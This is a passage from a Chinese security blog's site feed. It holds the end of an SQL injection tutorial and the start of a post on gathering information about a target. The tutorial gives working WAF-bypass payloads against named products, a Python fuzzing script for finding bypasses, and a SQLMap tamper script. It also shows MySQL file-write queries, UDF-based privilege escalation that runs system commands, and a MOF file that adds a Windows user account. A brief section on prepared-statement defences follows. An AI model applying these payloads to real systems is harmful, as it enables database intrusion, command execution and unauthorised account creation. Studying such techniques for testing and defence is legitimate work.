master.dbo.sysdatabases</span><br></pre></td></tr></table></figure><h3 id="URI参数溢出"><a href="#URI参数溢出" class="headerlink" title="URI参数溢出"></a>URI参数溢出</h3><p>提交100个以上参数：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.204.128/test.php</span><br><span class="line"></span><br><span class="line">POST：id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp; id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1 union select 1,2,schema_name %0a/*!from*/information_schema.SCHEMATA</span><br></pre></td></tr></table></figure></p><p>MSSQL<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.204.128/test.aspx</span><br><span class="line"></span><br><span class="line">POST：id=1/*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*/ union select null,table_name,null from INFOMATION_SCHEMA.tables</span><br></pre></td></tr></table></figure></p><h2 id="绕过360主机卫士"><a href="#绕过360主机卫士" class="headerlink" title="绕过360主机卫士"></a>绕过360主机卫士</h2><p>详细请参考<a href="https://www.t00ls.net/articles-45943.html" target="_blank" rel="noopener">Bypass 360主机卫士SQL注入防御（多姿势）</a></p><h3 id="利用默认白名单"><a href="#利用默认白名单" class="headerlink" title="利用默认白名单"></a>利用默认白名单</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/test.php/1.png?id=1 union select 1,2,schema_name from information_schema.SCHEMATA</span><br></pre></td></tr></table></figure><h3 id="利用静态资源"><a href="#利用静态资源" class="headerlink" title="利用静态资源"></a>利用静态资源</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/test.php/1.png?id=1 union select 1,2,schema_name from information_schema.SCHEMATA</span><br></pre></td></tr></table></figure><h3 id="缓冲区溢出"><a href="#缓冲区溢出" class="headerlink" title="缓冲区溢出"></a>缓冲区溢出</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=1 and (select 1)=(Select 0xAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA) union select 1,2,schema_name from information_schema.SCHEMATA</span><br></pre></td></tr></table></figure><h3 id="URI参数溢出-1"><a href="#URI参数溢出-1" class="headerlink" title="URI参数溢出"></a>URI参数溢出</h3><p>同ngx_lua_waf</p><h3 id="GET-POST"><a href="#GET-POST" class="headerlink" title="GET+POST"></a>GET+POST</h3><p>提交POST请求时，忽略GET请求中的参数</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.204.132/sql.aspx?id=1 and 1=2 union select 1,column_name,3 from information_schema.columns</span><br><span class="line"></span><br><span class="line">POST：aaa</span><br></pre></td></tr></table></figure><h3 id="multipart-form-data"><a href="#multipart-form-data" class="headerlink" title="multipart/form-data"></a>multipart/form-data</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">------WebKitFormBoundaryACZoaLJJzUwc4hYM</span><br><span class="line">Content-Disposition: form-data; name=&quot;id&quot;</span><br><span class="line">1 union /*!select*/ 1,2,schema_name</span><br><span class="line">from information_schema.SCHEMATA</span><br><span class="line">------WebKitFormBoundaryACZoaLJJzUwc4hYM--</span><br></pre></td></tr></table></figure><h3 id="内联注释"><a href="#内联注释" class="headerlink" title="内联注释"></a>内联注释</h3><p>直接用fuzz脚本，结合注释、空格绕过和<code>/*!*/</code>进行绕过：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">"http://test.com/index.php?id=1"</span></span><br><span class="line">Fuzz_a = [ <span class="string">'/*!'</span>, <span class="string">'*/'</span>, <span class="string">'/**/'</span>, <span class="string">'/'</span>, <span class="string">'?'</span>, <span class="string">'~'</span>, <span class="string">'!'</span>, <span class="string">'.'</span>, <span class="string">'%'</span>, <span class="string">'-'</span>, <span class="string">'*'</span>, <span class="string">'+'</span>, <span class="string">'='</span>]</span><br><span class="line">Fuzz_b = [<span class="string">''</span>]</span><br><span class="line">Fuzz_c = [<span class="string">'%0a'</span>, <span class="string">'%0b'</span>, <span class="string">'%0c'</span>, <span class="string">'%0d'</span>, <span class="string">'%0e'</span>, <span class="string">'%0f'</span>, <span class="string">'%0h'</span>, <span class="string">'%0i'</span>, <span class="string">'%0j'</span>]</span><br><span class="line">FUZZ = Fuzz_a + Fuzz_b + Fuzz_c</span><br><span class="line"><span class="comment"># 配置fuzz字典</span></span><br><span class="line">header = &#123; <span class="string">'User-Agent'</span>: <span class="string">'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:55.0) Gecko/20100101 Firefox/55.0'</span>&#125;</span><br><span class="line">sql=<span class="string">'union select SCHEMA_NAME,2 from information_schema.SCHEMATA'</span></span><br><span class="line">sql_arr=<span class="string">"/*!&#123;&#125;*/#"</span>.format(sql).split()</span><br><span class="line"><span class="comment"># 设置请求的headers</span></span><br><span class="line"><span class="keyword">for</span> a <span class="keyword">in</span> FUZZ:</span><br><span class="line">    <span class="keyword">for</span> b <span class="keyword">in</span> FUZZ:</span><br><span class="line">        <span class="keyword">for</span> c <span class="keyword">in</span> FUZZ:</span><br><span class="line">            <span class="keyword">for</span> d <span class="keyword">in</span> FUZZ:</span><br><span class="line">                <span class="keyword">for</span> e <span class="keyword">in</span> FUZZ:</span><br><span class="line">                    fuzz_here=a + b + c + d + e</span><br><span class="line">                    <span class="comment"># RAW: PYLOAD = "/*!union" + fuzz_here + "select 1,2*/#"</span></span><br><span class="line">                    PYLOAD = fuzz_here.join(sql_arr)</span><br><span class="line">                    <span class="comment">#  exit(0)</span></span><br><span class="line">                    urlp = url + PYLOAD</span><br><span class="line">                    res = requests.get(urlp, headers=header)</span><br><span class="line">                    <span class="comment"># 使用for排列组合fuzz字典并请求页面, 因为组合后不一定符合sql语句，所以需要用正常页面特征做判断</span></span><br><span class="line">                    <span class="keyword">if</span> <span class="string">'wait'</span> <span class="keyword">in</span> res.text:</span><br><span class="line">                        <span class="keyword">print</span> (<span class="string">"[*]URL:"</span> + urlp + <span class="string">u"过狗！"</span>)</span><br><span class="line">                        <span class="comment"># 如果返回的页面中包含wait字符，则打印并写出过狗payload。</span></span><br></pre></td></tr></table></figure><h2 id="绕过护卫神"><a href="#绕过护卫神" class="headerlink" title="绕过护卫神"></a>绕过护卫神</h2><p>详细请参考<a href="https://www.t00ls.net/articles-46165.html" target="_blank" rel="noopener">Bypass 护卫神SQL注入防御（多姿势）</a></p><h3 id="00截断"><a href="#00截断" class="headerlink" title="%00截断"></a>%00截断</h3><p>ASPX:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/sql.aspx?id=1%00and 1=2 union select 1,2,column_name from information_schema.columns</span><br></pre></td></tr></table></figure><p>PHP:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/sql.php?id=1/*%00*/union select 1,schema_name,3 from information_schema.schemata</span><br></pre></td></tr></table></figure><h3 id="Unicode编码"><a href="#Unicode编码" class="headerlink" title="Unicode编码"></a>Unicode编码</h3><p>适用于IIS服务器<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.204.132/sql.aspx?id=1 and 1=2 union s%u0045lect 1,2,column_name from information_schema.columns</span><br></pre></td></tr></table></figure></p><h3 id="HPP"><a href="#HPP" class="headerlink" title="HPP"></a>HPP</h3><p>ASPX中接受参数顺序为为GET，POST，COOKIE：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.204.132/sql.aspx?id=1 and 1=2 union/*</span><br><span class="line"></span><br><span class="line">POST：id=*/select 1,column_name,3 from information_schema.columns</span><br></pre></td></tr></table></figure><h3 id="号"><a href="#号" class="headerlink" title="%号"></a>%号</h3><p>IIS+ASP中解析会去掉%：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/sql.asp?id=1 and 1=2 un%ion select 1,2,column_name from information_schema.columns</span><br></pre></td></tr></table></figure><h3 id="缓冲区溢出-1"><a href="#缓冲区溢出-1" class="headerlink" title="缓冲区溢出"></a>缓冲区溢出</h3><p>同360的缓冲区溢出，(Select 0xA*49099)。</p><h2 id="绕过安全狗"><a href="#绕过安全狗" class="headerlink" title="绕过安全狗"></a>绕过安全狗</h2><p>同360主机卫士的内联注释绕过</p><h2 id="分块传输"><a href="#分块传输" class="headerlink" title="分块传输"></a>分块传输</h2><p>详见<a href="https://anemone.top/HTTP-HTTP协议复习/">HTTP协议复习</a>分块传输部分</p><h2 id="SQLMap-Tamper写法"><a href="#SQLMap-Tamper写法" class="headerlink" title="SQLMap Tamper写法"></a>SQLMap Tamper写法</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> lib.core.enums <span class="keyword">import</span> PRIORITY</span><br><span class="line"><span class="keyword">from</span> lib.core.settings <span class="keyword">import</span> UNICODE_ENCODING</span><br><span class="line">__priority__ = PRIORITY.LOW</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dependencies</span><span class="params">()</span>:</span></span><br><span class="line">  <span class="keyword">pass</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">tamper</span><span class="params">(payload, **kwargs)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> payload:</span><br><span class="line">        payload=payload.replace(<span class="string">"UNION ALL SELECT"</span>,<span class="string">"union%23!@%23$%%5e%26%2a()%60~%0a/*!12345select*/"</span>)</span><br><span class="line">        payload=payload.replace(<span class="string">"UNION SELECT"</span>,<span class="string">"union%23!@%23$%%5e%26%2a()%60~%0a/*!12345select*/"</span>)</span><br><span class="line">        payload=payload.replace(<span class="string">" FROM "</span>,<span class="string">"/*!%23!@%23$%%5e%26%2a()%60~%0afrOm*/"</span>)</span><br><span class="line">        payload=payload.replace(<span class="string">"CONCAT"</span>,<span class="string">"/*!12345CONCAT*/"</span>)</span><br><span class="line">        payload=payload.replace(<span class="string">"CAST("</span>,<span class="string">"/*!12345CAST(*/"</span>)</span><br><span class="line">        payload=payload.replace(<span class="string">"CASE"</span>,<span class="string">"/*!12345CASE*/"</span>)</span><br><span class="line">        payload=payload.replace(<span class="string">"DATABASE()"</span>,<span class="string">"database/**/()"</span>)</span><br><span class="line">    <span class="keyword">return</span> payload</span><br></pre></td></tr></table></figure><h1 id="不同用户的权限"><a href="#不同用户的权限" class="headerlink" title="不同用户的权限"></a>不同用户的权限</h1><h2 id="MySQL"><a href="#MySQL" class="headerlink" title="MySQL"></a>MySQL</h2><p>普通用户有information_schema表的读权限，但没有mysql表的读权限</p><h2 id="MSSQL"><a href="#MSSQL" class="headerlink" title="MSSQL"></a>MSSQL</h2><p>很复杂，详细看<a href="https://paper.tuisec.win/detail/9146d3bd2335703" target="_blank" rel="noopener">深秋之夜360面试有感</a></p><h1 id="写文件"><a href="#写文件" class="headerlink" title="写文件"></a>写文件</h1><p>需要解除<code>secure-file-priv=</code><br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="string">'文件内容'</span> <span class="keyword">into</span> <span class="keyword">outfile</span> <span class="string">'文件路径'</span></span><br><span class="line"><span class="keyword">select</span> <span class="string">'文件内容'</span> <span class="keyword">into</span> <span class="keyword">dumpfile</span> <span class="string">'文件路径'</span></span><br></pre></td></tr></table></figure></p><h1 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h1><h2 id="用户自定义函数提权（UDF）"><a href="#用户自定义函数提权（UDF）" class="headerlink" title="用户自定义函数提权（UDF）"></a>用户自定义函数提权（UDF）</h2><h3 id="获取UDF-dll的hex编码"><a href="#获取UDF-dll的hex编码" class="headerlink" title="获取UDF.dll的hex编码"></a>获取UDF.dll的hex编码</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select hex(load_file(%USER%\\Desktop\\udf.dll)) into dumpfile &apos;%USER%\\Desktop\\udf.txt&apos;;</span><br></pre></td></tr></table></figure><h3 id="保存udf-dll到目标主机"><a href="#保存udf-dll到目标主机" class="headerlink" title="保存udf.dll到目标主机"></a>保存udf.dll到目标主机</h3><p>若数据库版本为5.0以下将其保存到<code>C:\Windows\</code>或<code>C:\Windows\System32\</code>，否则保存到<code>@@basedir\lib\plugin\</code></p><p>使用<code>select &#39;xxx&#39; into dumpfile &#39;C:/MySQL/lib/plugin/::$INDEX_ALLOCATION&#39;;</code>新建文件夹(这里我没成功，网上说确实不成功)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">CREATE TABLE Temp_udf(udf BLOB);</span><br><span class="line">INSERT into Temp_udf values (unhex(&apos;$shellcode&apos;));   #$shellcode为hex(udf.dll)</span><br><span class="line">SELECT udf FROM Temp_udf INTO DUMPFILE &apos;C:/MySQL/lib/plugin/udf.dll&apos;;</span><br></pre></td></tr></table></figure><h3 id="使用用户函数提权"><a href="#使用用户函数提权" class="headerlink" title="使用用户函数提权"></a>使用用户函数提权</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">create function cmdshell returns string soname &apos;udf.dll&apos;;  #此处不能填绝对路径 只能是dll名</span><br><span class="line">select * from mysql.func;                  #看看cmdshell function是否创立，创立就继续</span><br><span class="line">select hex(cmdshell(&apos;whoami&apos;));            #运行各种命令提权</span><br></pre></td></tr></table></figure><h2 id="mof提权"><a href="#mof提权" class="headerlink" title="mof提权"></a>mof提权</h2><p>由于<strong>c:/windows/system32/wbem/mof/</strong>目录下的 <strong>nullevt.mof</strong> 文件，每分钟都会在一个特定的时间去执行一次，因此可以使用dumpfile将shell写入，然后由系统执行（有点像linux的crontab）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">#pragma namespace(&quot;\\\\.\\root\\subscription&quot;)</span><br><span class="line"> </span><br><span class="line">instance of __EventFilter as $EventFilter</span><br><span class="line">&#123;</span><br><span class="line">    EventNamespace = &quot;Root\\Cimv2&quot;;</span><br><span class="line">    Name  = &quot;filtP2&quot;;</span><br><span class="line">    Query = &quot;Select * From __InstanceModificationEvent &quot;</span><br><span class="line">            &quot;Where TargetInstance Isa \&quot;Win32_LocalTime\&quot; &quot;</span><br><span class="line">            &quot;And TargetInstance.Second = 5&quot;;</span><br><span class="line">    QueryLanguage = &quot;WQL&quot;;</span><br><span class="line">&#125;;</span><br><span class="line"> </span><br><span class="line">instance of ActiveScriptEventConsumer as $Consumer</span><br><span class="line">&#123;</span><br><span class="line">    Name = &quot;consPCSV2&quot;;</span><br><span class="line">    ScriptingEngine = &quot;JScript&quot;;</span><br><span class="line">    ScriptText =</span><br><span class="line">&quot;var WSH = new ActiveXObject(\&quot;WScript.Shell\&quot;)\nWSH.run(\&quot;net.exe user anemone /add\&quot;)&quot;;</span><br><span class="line">&#125;;</span><br><span class="line"> </span><br><span class="line">instance of __FilterToConsumerBinding</span><br><span class="line">&#123;</span><br><span class="line">    Consumer   = $Consumer;</span><br><span class="line">    Filter = $EventFilter;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>上传之后用mysql写文件：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select load_file(&apos;c:/www/nullevt.mof&apos;) into dumpfile &apos;c:/windows/system32/wbem/mof/nullevt.mof&apos;</span><br></pre></td></tr></table></figure><h1 id="防御——使用预编译语句"><a href="#防御——使用预编译语句" class="headerlink" title="防御——使用预编译语句"></a>防御——使用预编译语句</h1><p>预先编译sql，后面的注入语句只能做普通字符串查询，预编译语句不能用于orderby</p><p>SQL写法：</p><ol><li><p>预编译</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">prepare ins from &apos;insert into t select ?,?&apos;;</span><br></pre></td></tr></table></figure></li><li><p>执行</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">set @a=999,@b=&apos;hello&apos;;</span><br><span class="line">execute ins using @a,@b;</span><br><span class="line">select * from t;</span><br></pre></td></tr></table></figure></li><li><p>释放</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">deallocate prepare ins;</span><br></pre></td></tr></table></figure></li></ol><p>三次交互：</p><p><img src="/sqli-SQL注入总结/1551840783777.png" alt="1551840783777"></p><p>Python写法，python并不支持MySQL的预编译语句（第三方库oursql支持），只是将字符串转义后放到数据库查询：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cursor.execute(<span class="string">'insert into user (name,password) value (%s,%s)'</span>,(name,password))</span><br></pre></td></tr></table></figure><p>Java写法，需要开启预编译功能（useServerPrepStmts=true），程序与数据库3次交互prepare-&gt;execute-&gt;close stmt</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    Class.forName(name);<span class="comment">//指定连接类型</span></span><br><span class="line">    conn = DriverManager.getConnection(url, user, password);<span class="comment">//获取连接</span></span><br><span class="line">    pst = conn.prepareStatement(<span class="string">"SELECT * FROM users WHERE `name`=?"</span>);<span class="comment">//准备执行语句</span></span><br><span class="line">    pst.setString(<span class="number">1</span>,<span class="string">"9ian1i"</span>);</span><br><span class="line">    rs = pst.executeQuery();</span><br><span class="line">    <span class="keyword">while</span> (rs.next())&#123;</span><br><span class="line">        String name = rs.getString(<span class="string">"name"</span>);</span><br><span class="line">        System.out.println(name);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>php写法</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$name=$_GET[<span class="string">'name'</span>];</span><br><span class="line">$mysqli = <span class="keyword">new</span> mysqli(<span class="string">'127.0.0.1'</span>,<span class="string">'root'</span>,<span class="string">'root'</span>,<span class="string">'test'</span>);</span><br><span class="line">$mysqli_stmt=$mysqli-&gt;prepare(<span class="string">"select username, password from test where username=?"</span>);</span><br><span class="line">$mysqli_stmt-&gt;bind_param(<span class="string">'s'</span>, $name);</span><br><span class="line">$mysqli_stmt-&gt;execute();</span><br><span class="line">$mysqli_stmt-&gt;bind_result($username, $password);</span><br><span class="line"><span class="keyword">while</span>($mysqli_stmt-&gt;fetch())&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"$username--$password"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ul><li><p>十种MySQL报错注入，<a href="https://www.cnblogs.com/xishaonian/p/6102750.html" target="_blank" rel="noopener">https://www.cnblogs.com/xishaonian/p/6102750.html</a></p></li><li><p>深入探究宽字节注入漏洞与修补原理，<a href="https://blog.csdn.net/qq_29419013/article/details/81205291" target="_blank" rel="noopener">https://blog.csdn.net/qq_29419013/article/details/81205291</a> </p></li><li><p>Bypass ngx_lua_waf SQL注入防御（多姿势），<a href="https://www.t00ls.net/articles-45736.html" target="_blank" rel="noopener">https://www.t00ls.net/articles-45736.html</a></p></li><li><p>Bypass 360主机卫士SQL注入防御（多姿势），<a href="https://www.t00ls.net/articles-45943.html" target="_blank" rel="noopener">https://www.t00ls.net/articles-45943.html</a></p></li><li><p>Bypass 护卫神SQL注入防御（多姿势），<a href="https://www.t00ls.net/articles-46165.html" target="_blank" rel="noopener">https://www.t00ls.net/articles-46165.html</a> </p></li><li><p>深秋之夜360面试有感，<a href="https://paper.tuisec.win/detail/9146d3bd2335703" target="_blank" rel="noopener">https://paper.tuisec.win/detail/9146d3bd2335703</a></p></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;注入类型&quot;&gt;&lt;a href=&quot;#注入类型&quot; class=&quot;headerlink&quot; title=&quot;注入类型&quot;&gt;&lt;/a&gt;注入类型&lt;/h1&gt;&lt;h2 id=&quot;Union-Based&quot;&gt;&lt;a href=&quot;#Union-Based&quot; class=&quot;headerlink&quot; ti
      
    
    </summary>
    
      <category term="Web安全-SQL注入" scheme="http://anemone.top/categories/Web%E5%AE%89%E5%85%A8-SQL%E6%B3%A8%E5%85%A5/"/>
    
    
      <category term="SQL" scheme="http://anemone.top/tags/SQL/"/>
    
      <category term="注入" scheme="http://anemone.top/tags/%E6%B3%A8%E5%85%A5/"/>
    
      <category term="waf绕过" scheme="http://anemone.top/tags/waf%E7%BB%95%E8%BF%87/"/>
    
  </entry>
  
  <entry>
    <title>信息收集思路整理</title>
    <link href="http://anemone.top/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86-%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E6%80%9D%E8%B7%AF%E6%95%B4%E7%90%86/"/>
    <id>http://anemone.top/信息收集-信息收集思路整理/</id>
    <published>2019-02-10T07:08:35.000Z</published>
    <updated>2019-09-22T10:14:18.722Z</updated>
    
    <content type="html"><![CDATA[<p>信息收集是渗透测试的第一步，本文总结目前信息收集的具体操作步骤。</p><h1 id="网站信息"><a href="#网站信息" class="headerlink" title="网站信息"></a>网站信息</h1><h2 id="whois信息"><a href="#whois信息" class="headerlink" title="whois信息"></a>whois信息</h2><p>可以收集到的信息有：</p><ul><li>联系人</li><li>邮箱（可以到社工库进一步查询）</li><li>电话</li></ul><p>收集途径有：</p><ul><li><a href="http://whois.chinaz.com/" target="_blank" rel="noopener">http://whois.chinaz.com/</a> （站长之家）</li><li><a href="https://who.is/" target="_blank" rel="noopener">https://who.is/</a> （国外）</li><li><a href="https://x.threatbook.cn/（通过邮箱查询其他的站点）" target="_blank" rel="noopener">https://x.threatbook.cn/（通过邮箱查询其他的站点）</a></li><li><a href="https://dns.aizhan.com/" target="_blank" rel="noopener">https://dns.aizhan.com/</a> （IP反查域名）</li><li>命令<code>whois anemone.top</code> </li></ul><h2 id="备案信息"><a href="#备案信息" class="headerlink" title="备案信息"></a>备案信息</h2><p>仍然是收集联系人、公司等信息</p><p>途径有：</p><ul><li><a href="https://www.tianyancha.com/brand/b59c12209" target="_blank" rel="noopener">https://www.tianyancha.com/brand/b59c12209</a> （天眼查）</li><li><a href="http://www.gsxt.gov.cn（国家信用公示）" target="_blank" rel="noopener">http://www.gsxt.gov.cn（国家信用公示）</a></li><li><a href="http://icp.chinaz.com（站长之家，可以查询其他备案站点）" target="_blank" rel="noopener">http://icp.chinaz.com（站长之家，可以查询其他备案站点）</a></li></ul><h2 id="DNS信息"><a href="#DNS信息" class="headerlink" 